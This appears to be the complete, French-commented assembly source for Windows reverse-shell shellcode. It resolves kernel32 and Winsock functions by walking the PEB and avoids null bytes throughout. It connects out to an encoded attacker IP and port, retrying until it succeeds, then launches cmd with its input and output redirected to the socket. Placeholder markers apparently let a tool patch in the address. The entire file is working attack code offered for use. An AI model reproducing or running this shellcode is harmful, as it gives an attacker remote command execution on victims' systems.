;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Explication du shellcode.
; -On crée des varibales
;
; -On recherche dynamiquement Kernel32.dll
; -On recherche LoadLibraryA() dans Kernel32 et on stock l'adresse de la fonction.
; -On recherche dynamiquement Kernel32.dll
; -On recherche GetProcAddress() dans Kernel32  et on stock l'adresse de la fonction.
; -On charge la library "ws2_32.dll" avec LoadLibraryA() et on stock le HANDLE
; -On recherche WSAStartUp avec GetProcAddress() et on stock son adresse
; -On recherche WSASocketA avec GetProcAddress() et on stock son adresse
; -On recherche connect avec GetProcAddress() et on stock son adresse
; -On recherche recv avec GetProcAddress() et on stock son adresse
;
; -On appel WSAStartUp() 
; -On appel WSASocketA() 
; -On appel connect() 
; -On appel recv() 
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Création d'une stack vide
push ebp
mov ebp, esp

; Création est allocation vide de variables
sub esp, 24h                    ; Création d'éspace dans la stack
xor eax, eax                    ; EAX à zero
mov [ebp - 04h], eax            ; LoadLibraryA address
mov [ebp - 08h], eax            ; GetProcAddress address
mov [ebp - 0ch], eax            ; CreateProcessA address
mov [ebp - 10h], eax            ; HANDLE ws2_32.dll
mov [ebp - 14h], eax            ; WSAStartUp address
mov [ebp - 18h], eax            ; WSASocketA address
mov [ebp - 1ch], eax            ; connect address
mov [ebp - 20h], eax            ; recv address
mov [ebp - 24h], eax            ; send address

;Recherche de Kernel32
mov edi, [fs:eax+0x30]
mov edi, [edi+0x0c]
mov edi, [edi+0x1c]

k32A_loop:
mov ebx, [edi+0x08]
mov esi, [edi+0x20]
mov edi, [edi]
cmp byte [esi+12], '3'
jne k32A_loop

;Kernel32 PE Header
mov edi, ebx
add edi, [ebx+0x3c]

;Kernel32 Export Directory Table
mov ecx, [edi+0x78]
add ecx, ebx

;Kernel32 Name Pointers
mov edi, [ecx+0x20]
add edi, ebx

;Recherche de LoadLibraryA
LLA_loop:
mov esi, [edi+eax*4]
add esi, ebx
inc eax
cmp dword [esi],   0x64616f4c ;daoL
jne LLA_loop
cmp dword [esi+7], 0x79726172 ;yrar
jne LLA_loop

;LoadLibraryA ordinal
mov edi, [ecx+0x24]
add edi, ebx
mov ax, [edi+eax*2]

;LoadLibraryA addresse
mov edi, [ecx+0x1C]
add edi, ebx
mov edi, [edi+(eax-1)*4] ;subtract ordinal base
add edi, ebx
mov [ebp - 04h], edi

;Find Kernel32 Base
xor eax,eax ; Mise à 0 de EAX
mov edi, [fs:eax+0x30]
mov edi, [edi+0x0c]
mov edi, [edi+0x1c]

k32B_loop:
mov ebx, [edi+0x08]
mov esi, [edi+0x20]
mov edi, [edi]
cmp byte [esi+12], '3'
jne k32B_loop

;Kernel32 PE Header
mov edi, ebx
add edi, [ebx+0x3c]

;Kernel32 Export Directory Table
mov ecx, [edi+0x78]
add ecx, ebx

;Kernel32 Name Pointers
mov edi, [ecx+0x20]
add edi, ebx

;Trouver GetProcAddress
GPA_loop:
mov esi, [edi+eax*4]
add esi, ebx
inc eax
cmp dword [esi],   0x50746547 ;PteG
jne GPA_loop
cmp dword [esi+4], 0x41636f72 ;Acor
jne GPA_loop

;GetProcAddress ordinal
mov edi, [ecx+0x24]
add edi, ebx
mov ax, [edi+eax*2]

;GetProcAddress addresse
mov edi, [ecx+0x1C]
add edi, ebx
mov edi, [edi+(eax-1)*4] ;subtract ordinal base
add edi, ebx
mov [ebp - 08h], edi

;Find Kernel32 Base
xor eax,eax ; Mise à 0 de EAX
mov edi, [fs:eax+0x30]
mov edi, [edi+0x0c]
mov edi, [edi+0x1c]

k32C_loop:
mov ebx, [edi+0x08]
mov esi, [edi+0x20]
mov edi, [edi]
cmp byte [esi+12], '3'
jne k32C_loop

;Kernel32 PE Header
mov edi, ebx
add edi, [ebx+0x3c]

;Kernel32 Export Directory Table
mov ecx, [edi+0x78]
add ecx, ebx

;Kernel32 Name Pointers
mov edi, [ecx+0x20]
add edi, ebx

;Trouver CreateProcessA
; aerC rPet seco AAAs
CPA_loop:
mov esi, [edi+eax*4]
add esi, ebx
inc eax
cmp dword [esi],   0x61657243 ;aerC
jne CPA_loop
cmp dword [esi+4], 0x72506574 ;rPet
jne CPA_loop
cmp dword [esi+8], 0x7365636f ;seco
jne CPA_loop

;CreateProcessA ordinal
mov edi, [ecx+0x24]
add edi, ebx
mov ax, [edi+eax*2]

;CreateProcessA addresse
mov edi, [ecx+0x1C]
add edi, ebx
mov edi, [edi+(eax-1)*4] ;subtract ordinal base
add edi, ebx
mov [ebp - 0ch], edi

;Recherche de ws2_32
xor eax,eax ; Mise à 0 de EAX
push 0x41416c6c ; AAll
mov [esp+2],word ax
push 0x642e3233 ; d.23
push 0x5f327377 ; _2sw
lea ebx,[esp]
push ebx
call [ebp - 04h]
mov [ebp - 10h], eax 

;Recherche de WSAStartUp
xor eax,eax ; Mise à 0 de EAX
push 0x41417075 ; pu
mov [esp+2],word ax
push 0x74726174 ; tart
push 0x53415357 ; SASW
lea ebx,[esp]
push ebx ; "WSAStartup"
mov ebx, [ebp - 10h] ; ws2 HANDLE
push ebx 
call [ebp - 08h] ; GetProcAddress
mov [ebp - 14h], eax ; WSAStartup address

;Recherche de WSASocketA
xor eax,eax ; Mise à 0 de EAX
push 0x41414174 ; AAAt
mov [esp+2],word ax
push 0x656b636f ; ekco
push 0x53415357 ; SASW
lea ebx,[esp]
push ebx ; "WSASocketA"
mov ebx, [ebp - 10h] ; ws2 HANDLE
push ebx 
call [ebp - 08h] ; GetProcAddress
mov [ebp - 18h], eax ; WSASocketA address

;Recherche de connect
xor eax,eax ; Mise à 0 de EAX
push 0x41746365 ; Atce
mov [esp+3],byte al ; Methode anti null byte
push 0x6e6e6f63 ; nnoc
lea ebx,[esp]
push ebx ; "connect"
mov ebx, [ebp - 10h] ; ws2 HANDLE
push ebx 
call [ebp - 08h] ; GetProcAddress
mov [ebp - 1ch], eax ; connect address

;Recherche de recv
xor eax,eax ; Mise à 0 de EAX
push eax ; empty
push 0x76636572 ; vcer
lea ebx,[esp]
push ebx ; "recv"
mov ebx, [ebp - 10h] ; ws2 HANDLE
push ebx 
call [ebp - 08h] ; GetProcAddress
mov [ebp - 20h], eax ; recv address

;Recherche de send
xor eax,eax ; Mise à 0 de EAX
mov eax, 0xffffffff ; Anti NullByte
sub eax, 0xffffffff
push eax ; empty
xor eax,eax
push 0x646e6573 ; dnes
lea ebx,[esp]
push ebx ; "send"
mov ebx, [ebp - 10h] ; ws2 HANDLE
push ebx
call [ebp - 08h] ; GetProcAddress
mov [ebp - 24h], eax ; send address

; Call WSAStartup
xor ebx,ebx ; Mise à 0 de EBX
mov ebx,0x1191221
sub ebx,0x1191091
sub esp,ebx
push esp
push ebx
mov ebx,[ebp - 14h]
call ebx

; Call WSASocketA
xor ebx,ebx ; Mise à 0 de EBX
push ebx
push ebx
push ebx
xor edx, edx
mov dl, 6
push edx
inc ebx
push ebx
inc ebx
push ebx
mov ebx, [ebp - 18h]
call ebx
mov edi,eax

; Call connect
connect:
xor ebx,ebx ; ANDROS01 Mise à 0 de EBX
mov ebx, 0xffffffff ; ANDROS02
sub ebx, 0xfeffff80 ; ANDROS03 IP
push ebx ; ANDROS04
xor ebx,ebx ; ANDROS05 Mise à 0 de EBX
mov ebx, 0xffffffff ; ANDROS06
sub bx, 0x47DD ; ANDROS07 PORT
push bx ; ANDROS08

; ANDROS09
; ANDROS10

xor ebx,ebx ; Mise à 0 de EBX
add bl, 2 
push word bx                     ; 16b
mov edx, esp
push byte 16                     ; 17b
push edx                         ; 25b
push edi                         ; 54b
mov [ebp - 60h], edi
mov ebx, [ebp - 1ch]
call ebx
xor ebx,ebx
mov ebx,0xffffffff
sub ebx,0xffffffff
cmp eax, ebx ;ERROR_SUCCESS
xor ebx,ebx
je start_proc
sub esp, 0x54 ; EN TEST
jmp connect

start_proc:
mov edx, 0x646d6363     ; "ccmd"
shr edx, 8              ; edx = "cmd",0x00 // shr edx, 8 = Shifts the edx register to the right 8 bits
push edx
mov [ebp-0x44], esp     ; save PTR to String "cmd",0x00 on stack
xor edx, edx            ; clear edx register
sub esp, 0x10           ; Decrement the stack by 16 bytes (0x10)
mov [ebp-0x48], esp     ; save Address of PROCESS_INFORMATION struct onto Stack 0x48=72

; typedef struct _STARTUPINFOA { DWORD  cb; LPSTR  lpReserved; LPSTR  lpDesktop; LPSTR  lpTitle; DWORD  dwX; DWORD  dwY; DWORD  dwXSize; DWORD  dwYSize; DWORD  dwXCountChars; DWORD  dwYCountChars; DWORD  dwFillAttribute; DWORD  dwFlags; WORD   wShowWindow; WORD   cbReserved2; LPBYTE lpReserved2; HANDLE hStdInput; HANDLE hStdOutput; HANDLE hStdError; }
xor edx, edx            ; clear edx register
;   Redirect STDIN, STDOUT, STDERR to the clientSocket returned from accept() when client connected (similar to dup2 in linux)
push dword [ebp-0x60]   ; HANDLE hStdError  = Handle to clientSocket
push dword [ebp-0x60]   ; HANDLE hStdOutput = Handle to clientSocket
push dword [ebp-0x60]   ; HANDLE hStdInput  = Handle to clientSocket
push edx
push edx
xor eax, eax            ; clear eax register
inc eax
rol eax, 0x08
inc eax
push eax
push edx                ; DWORD dwFlags          = Null
push edx                ; DWORD dwFillAttribute  = Null
push edx                ; DWORD dwYCountChars    = Null
push edx                ; DWORD dwXCountChars    = Null
push edx                ; DWORD dwXSize          = Null
push edx                ; DWORD dwY              = Null
push edx                ; DWORD dwX              = Null
push edx                ; PTR lpTitle            = Null
push edx                ; PTR lpDesktop          = Null
push edx                ; PTR lpReserved         = Null
xor eax, eax            ; clear eax register
add al, 0x44            ; DWORD cb               = 0x44(68) // Sizeof STARTUP_INFO
push eax                ; push cb onto the stack
mov [ebp-0x4c], esp     ; save pointer to STARTUP_INFO struct onto Stack 0x4c=76

xor edx, edx            ; clear edx register
push dword [ebp-0x48]   ; PROCESS_INFORMATION
push dword [ebp-0x4c]   ; STARTUP_INFO
push edx                ; lpCurrentDirectory = Null
push edx                ; lpEnvt = Null
push edx                ; dwCreationFlags = 0/Null
xor eax, eax            ; clear eax
inc eax                 ; bInheritHandles = True = 1
push eax                ; push 1 to stack for bInheritHandles
push edx                ; lpThdAttrs = Null
push edx                ; lpPsAttrs  = Null
push dword [ebp-0x44]   ; lpCmdLine = push PTR to String "cmd",0x00 on stack
push edx                ; lpAppName = Null
mov ebx, [ebp-0ch]     ; Address for CreateProcessA 
call ebx                ; create process cmd 

comp:
; xor eax,eax //Boucle infinie, pour l'utiliser avec Andros on la commente, pour débug on la décommente
; mov eax, 0x1
; cmp eax,0x0
; jne comp
nop
nop